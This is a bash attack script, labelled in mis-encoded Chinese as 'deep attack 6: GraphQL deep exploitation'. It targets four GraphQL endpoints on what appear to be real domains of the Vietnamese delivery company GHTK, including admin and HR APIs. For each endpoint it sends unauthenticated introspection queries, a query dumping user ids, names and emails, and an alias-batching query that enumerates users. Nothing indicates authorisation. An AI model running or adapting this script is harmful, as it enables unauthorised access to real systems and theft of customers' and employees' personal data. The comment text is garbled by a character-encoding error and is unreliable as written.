#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ æ·±åº¦æ”»å‡»6ï¼šGraphQLæ·±åº¦åˆ©ç”¨"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

GRAPHQL_URLS=(
    "https://admin.giaohangtietkiem.vn/graphql"
    "https://dashboard.ghtk.vn/graphql"
    "https://inter.ghtk.vn/graphql"
    "https://hrm-api.ghtk.vn/graphql"
)

echo "[*] æµ‹è¯•GraphQLæœªæˆæƒè®¿é—®..."

for url in "${GRAPHQL_URLS[@]}"; do
    echo ""
    echo "â”â”â” $url â”â”â”"
    
    # å†…çœæŸ¥è¯¢ï¼ˆæ— éœ€è®¤è¯ï¼‰
    echo "[1] å†…çœæŸ¥è¯¢"
    curl -sk "$url" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __schema { types { name } } }"}' -m 3 | jq . 2>/dev/null | head -20
    
    # å°è¯•æŸ¥è¯¢ç”¨æˆ·
    echo "[2] ç”¨æˆ·æŸ¥è¯¢"
    curl -sk "$url" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{ users { id name email } }"}' -m 3 | jq . 2>/dev/null | head -20
    
    # æ‰¹é‡æŸ¥è¯¢ï¼ˆåˆ«åæ”»å‡»ï¼‰
    echo "[3] æ‰¹é‡æŸ¥è¯¢"
    curl -sk "$url" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{ u1: user(id:1) { name } u2: user(id:2) { name } u3: user(id:3) { name } }"}' -m 3
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
